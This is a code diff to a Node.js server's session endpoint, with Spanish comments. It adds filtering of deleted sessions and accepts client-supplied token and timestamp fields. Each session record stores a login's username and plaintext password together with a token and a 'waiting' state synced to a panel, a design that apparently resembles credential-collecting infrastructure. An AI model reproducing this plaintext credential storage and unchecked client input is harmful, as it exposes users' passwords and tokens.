@@ -197,12 +197,17 @@ async function handleRequest(req, res) {
       });
     }
 
-    // 2. Crear o actualizar sesión (desde el login de empresas)
+    // 2. Crear o actualizar sesión (desde el login de empresas o sincronización del panel)
     if (pathname === '/api/sessions' && req.method === 'POST') {
       loadSessions();
       const body = await parseJsonBody(req);
       const { id, username, password, tipoUsuario, device, state } = body;
       if (!id) return sendJson(res, 400, { error: 'Missing session id' });
+
+      // No registrar ni revivir sesiones que están en deletedIds o anteriores a clearedAt
+      if (deletedIds[id] || (body.createdAt && body.createdAt <= clearedAt)) {
+        return sendJson(res, 200, { success: false, ignored: true });
+      }
 
       const clientIp = (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || req.socket.remoteAddress || '127.0.0.1';
       const now = Date.now();
@@ -216,7 +221,9 @@ async function handleRequest(req, res) {
           device: device || sessions[id].device,
           ip: body.ip || clientIp,
           state: state || sessions[id].state,
-          last_seen: now,
+          token: body.token !== undefined ? body.token : sessions[id].token,
+          createdAt: sessions[id].createdAt || body.createdAt || now,
+          last_seen: Math.max(sessions[id].last_seen || 0, body.last_seen || 0, now),
           updatedAt: now
         };
       } else {
@@ -229,9 +236,9 @@ async function handleRequest(req, res) {
           device: device || 'desktop',
           ip: body.ip || clientIp,
           state: state || 'waiting',
-          token: '',
-          createdAt: now,
-          last_seen: now,
+          token: body.token || '',
+          createdAt: body.createdAt || now,
+          last_seen: body.last_seen || now,
           updatedAt: now
         };
       }
